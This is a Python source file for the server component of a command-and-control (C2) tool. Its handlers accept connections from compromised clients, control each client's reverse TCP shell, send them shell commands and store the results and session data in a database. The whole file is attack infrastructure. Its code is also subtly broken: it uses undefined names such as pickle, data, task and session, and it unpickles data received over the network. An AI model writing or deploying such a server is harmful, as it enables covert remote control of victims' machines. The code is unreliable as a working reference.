#!/usr/bin/python
# -*- coding: utf-8 -*-

__doc__ = ''' 

  Request Handler
    handles HTTP requests for files, resources,
    packages, and any user-defined modules
    added to the 'remote' folder

  Task Handler
    handles incoming tasks completed by clients
    operating in passive mode and passes them to
    the database for storage

  Session Handler
    handles incoming client connections in
    separate threads which are each responsible
    for controlling their respective client's
    reverse TCP shell and adding/updating the
    database with the client’s sessions & tasks

'''

# standard library
import os
import sys
import json
import time
import struct
import socket
import threading
import collections
from SimpleHTTPServer import SimpleHTTPRequestHandler as RequestHandler

# packages
import socketserver

# modules
import util
import security


class TaskHandler(socketserver.StreamRequestHandler):
    """ 
    Task handler for the C2 server that handles
    incoming tasks from clients operating in 
    passive mode
    """

    def handle(self):
        """ 
        Unpack, decrypt, and unpickle an incoming
        completed task from a client, and pass it
        to the database for storage
        """
        while True:
            hdr_size = struct.calcsize('!L')
            hdr      = self.connection.recv(hdr_size)
            msg_size = struct.unpack('!L', hdr)[0]
            msg      = self.connection.recv(msg_size)
            while len(msg) < msg_size:
                msg += self.connection.recv(msg_size - len(msg))
            session = self.server._get_client_by_connection(self.connection)
            task    = pickle.loads(security.decrypt_aes(msg, session.key))
            if isinstance(task, dict):
                self.server.database.handle_task(task)


class SessionHandler(socketserver.StreamRequestHandler):
    """ 
    Session handler for TCP Server that handles
    incoming connections from new sessions
    """

    def _kill(self):
        self._active.clear()
        self.server.session_remove(self.id)
        self.server.current_session = None
        self.server._active.set()
        self.server.run()

    def _info(self):
        header_size = struct.calcsize("L")
        header      = self.connection.recv(header_size)
        msg_size    = struct.unpack(">L", header)[0]
        msg         = self.connection.recv(msg_size)
        while len(msg) < msg_size:
             msg += self.connection.recv(msg_size - len(msg))
        info = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        info2 = self.server.database.handle_session(info)
        if isinstance(info2, dict):
            info = info2
        self.server.send_task(json.dumps(info))
        return info

    def status(self):
        """ 
        Check the status and duration of the session
        """
        c = time.time() - float(self._created)
        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
              '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
              '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
              '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
        return ', '.join([i for i in data if i])

    def send_task(self, command):
        """ 
        Send command to a client as a standard task

        `Required`
        :param str command:         shell/module command

        """
        raw_data    = security.encrypt_aes(json.dumps(task), session.key)
        packed_data = (struct.pack("!L", len(raw_data)) + raw_data)
        self.connection.sendall(packed_data)


    def recv_task(self):
        """ 
        Listen for incoming task results from a client

        """
        header_size = struct.calcsize("!L")
        header      = self.connection.recv(header_size)
        msg_size    = struct.unpack("!L", header)[0]
        msg         = self.connection.recv(msg_size)
        data        = security.decrypt_aes(msg, self.key)
        return json.loads(data)

    def handle(self):
        """ 
        Run a reverse TCP shell

        """
        self._prompt    = None
        self._active    = threading.Event()
        self._created   = time.time()
        self.id         = id
        self.key        = security.diffiehellman(self.connection)
        self.info       = self._info()
        while True:
            try:
                if self._active.wait():
                    task = self.server.recv_task() if not self._prompt else self._prompt
                    if 'help' in task.get('task'):
                        self._active.clear()
                        self.server.help(task.get('result'))
                        self._active.set()
                    elif 'prompt' in task.get('task'):                        
                        self._prompt = task
                        command = self._get_prompt(task.get('result') % int(self.id))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in self.server.commands and cmd != 'help':                            
                            result = self.server.commands[cmd](action) if len(action) else self.server.commands[cmd]()
                            if result:
                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                self.server.display(result)
                                self.server.database.handle_task(task)
                            continue
                        else:
                            task = self.server.database.handle_task({'task': command, 'session': self.info.get('uid')})
                            self.server.send_task(task)
                    elif 'result' in task:
                        if task.get('result') and task.get('result') != 'None':
                            self.server.display(task.get('result'))
                            self.server.database.handle_task(task)
                    else:
                        if self._abort:
                            break
                    self._prompt = None
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                break
        self._active.clear()
        self.server._return()
